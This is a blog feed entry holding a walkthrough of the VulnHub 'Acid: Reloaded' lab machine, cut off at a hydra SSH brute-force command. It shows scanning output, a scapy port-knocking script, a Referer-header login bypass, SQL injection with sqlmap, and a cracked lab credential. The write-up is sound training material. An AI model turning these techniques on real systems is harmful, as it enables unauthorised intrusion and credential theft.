<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-10-03T11:14:25-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]acid_reloaded]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded/"/>
    <updated>2015-09-12T07:49:42-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded</id>
    <content type="html"><![CDATA[<p>Acid: Reloaded is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Ports knocking to active hidden ports</li>
<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Write python script to make port knocking to active filtered ports</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden web login page and bypass it</li>
<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (&lt;a href="http://www.nta-monitor.com/tools/arp-scan/">http://www.nta-monitor.com/tools/arp-scan/&lt;/a>)
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.139  00:0c:29:bb:6e:b3   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:e3:03:1b   VMware, Inc.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>4 packets received by filter, 0 packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.139 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>Then I connect to target via SSH to grab banner.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
</span><span class='line'>    _    &lt;em>&lt;strong>&lt;em> &lt;/em>&lt;/strong> &lt;/em>&lt;em>&lt;strong>        &lt;/strong>&lt;strong>  &lt;/strong>&lt;/em>&lt;strong> _     &lt;/strong>&lt;em>    _    &lt;/em>&lt;strong>&lt;em>  &lt;/em>&lt;/strong>&lt;strong> &lt;/strong>&lt;strong>&lt;br/>
</span><span class='line'>   / \  / &lt;/strong>&lt;em>|&lt;/em> &lt;em>|  _ \      |  _ | &lt;/em>&lt;em>&lt;strong>| |   / _ \  / \  |  _ | &lt;/strong>&lt;strong>|  _ \
</span><span class='line'>  / _ | |    | || | | |&lt;/strong>&lt;/em>&lt;strong>| |&lt;em>) |  &lt;/em>| | |  | | | |/ _ \ | | | |  &lt;em>| | | | |
</span><span class='line'> / &lt;/em>&lt;/strong> \ |&lt;strong>&lt;em> | || |&lt;/em>| |&lt;/strong>&lt;strong>&lt;em>|  _ &lt;| |&lt;/em>&lt;/strong>| |&lt;strong>| |&lt;em>| / &lt;/em>&lt;/strong> | |&lt;em>| | |&lt;/em>&lt;strong>| |&lt;em>| |
</span><span class='line'>/&lt;/em>/   __&lt;/strong>&lt;em>|&lt;/em>&lt;strong>|&lt;/strong>&lt;strong>/      |_| __&lt;/strong>&lt;strong>|&lt;/strong>&lt;em>&lt;strong>_&lt;/strong>/&lt;/em>/   __&lt;strong>&lt;em>/|&lt;/em>&lt;/strong>&lt;strong>|&lt;/strong>__/&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                -by Acid
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>Wanna Knock me out ???
</span><span class='line'>3.2.1 Let&rsquo;s Start the Game.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&lt;a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#114;&#x6f;&#111;&#116;&#x40;&#49;&#48;&#46;&#49;&#46;&#x31;&#x2e;&#x31;&#x33;&#x39;">&#x72;&#111;&#111;&#x74;&#64;&#x31;&#x30;&#x2e;&#x31;&#46;&#x31;&#x2e;&#49;&#x33;&#57;&lt;/a>&rsquo;s password:</span></code></pre></td></tr></table></div></figure></p>

<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>

<p><figure class='code'><figcaption><span>knock.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">target</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.139</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">S</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">knocking</span> <span class="n">port</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span><span class="n">Done</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then use unicornscan to check again, found another port <code>33447</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode &lt;code>TCPscan' ports&lt;/code>1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open                 ssh[   22]     from 10.1.1.139  ttl 64
</span><span class='line'>TCP open             unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure></p>

<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.49BETA4 ( &lt;a href="https://nmap.org">https://nmap.org&lt;/a> ) at 2015-09-11 07:26 EDT
</span><span class='line'>NSE: Loaded 33 scripts for scanning.
</span><span class='line'>Initiating ARP Ping Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [2 ports]
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
</span><span class='line'>Initiating Service scan at 07:26
</span><span class='line'>Scanning 2 services on 10.1.1.139
</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
</span><span class='line'>NSE: Script scanning 10.1.1.139.
</span><span class='line'>Initiating NSE at 07:26
</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
</span><span class='line'>Nmap scan report for 10.1.1.139
</span><span class='line'>Host is up (0.00050s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Service detection performed. Please report any incorrect results at &lt;a href="https://nmap.org/submit/">https://nmap.org/submit/&lt;/a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure></p>

<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:3344/">http://10.1.1.139:3344/&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;h2>+ No web server found on 10.1.1.139:3344&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>0 host(s) tested
</span><span class='line'>root@kali:~# nikto -host &lt;a href="http://10.1.1.139:33447/">http://10.1.1.139:33447/&lt;/a>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Nikto v2.1.6&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          10.1.1.139&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    10.1.1.139&lt;/li>
</span><span class='line'>&lt;li>Target Port:        33447
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-09-11 07:31:36 (GMT-4)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.4.10 (Ubuntu)&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li>
</span><span class='line'>&lt;li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type&lt;/li>
</span><span class='line'>&lt;li>IP address found in the &lsquo;location&rsquo; header. The IP is &ldquo;127.0.1.1&rdquo;.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &ldquo;&lt;a href="http://127.0.1.1:33447/images/">http://127.0.1.1:33447/images/&lt;/a>&rdquo;.&lt;/li>
</span><span class='line'>&lt;li>Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.&lt;/li>
</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /bin/: This might be interesting&hellip; possibly a system shell found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>8330 requests: 0 error(s) and 11 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>

<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>

<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>

<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
</span><span class='line'>available databases [4]:                                                                                                                                                         &lt;br/>
</span><span class='line'>[&lt;em>] information_schema
</span><span class='line'>[&lt;/em>] mysql
</span><span class='line'>[&lt;em>] performance_schema
</span><span class='line'>[&lt;/em>] secure_login
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&hellip;
</span><span class='line'>Database: secure_login                                                                                                                                                           &lt;br/>
</span><span class='line'>[4 tables]
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>| UB3R/strcpy.exe |
</span><span class='line'>| login_attempts  |
</span><span class='line'>| members         |
</span><span class='line'>| word            |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>

<p>from the SQL injection exploit, I found <code>UB3R/strcpy.exe</code> which is interesting. Then I downloaded the binary file from <code>http://10.1.1.139:33447/UB3R/strcpy.exe</code>. By checking the file, I found there are some other files hidden in <code>strcpy.exe</code>, so I use <code>foremost</code> to recover them</p>

<p>keep the same steps as above until we found the file <code>Avinash.contact</code> which is a XML file and there is a string is base64 encoded. Then I decoded it and got <code>NooB@123</code></p>

<p>Then I created a dictionary file based on the names/keywords in file <code>Avinash.contact</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# cat dict.txt
</span><span class='line'>Avinash
</span><span class='line'>avinash
</span><span class='line'>Makke
</span><span class='line'>makke
</span><span class='line'>acid
</span><span class='line'>acid.exploit
</span><span class='line'>&lt;a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x61;&#99;&#105;&#x64;&#x2e;&#101;&#120;&#112;&#x6c;&#111;&#105;&#x74;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#x63;&#105;&#100;&#x2e;&#101;&#x78;&#x70;&#108;&#111;&#x69;&#x74;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;&lt;/a>
</span><span class='line'>NooB@123</span></code></pre></td></tr></table></div></figure></p>

<p>Then I use hydra with the file dict.txt to brute force SSH login, and found <code>makke/NooB@123</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# hydra -L dict.txt -P dict.txt 10.1.1.139 ssh -s 22
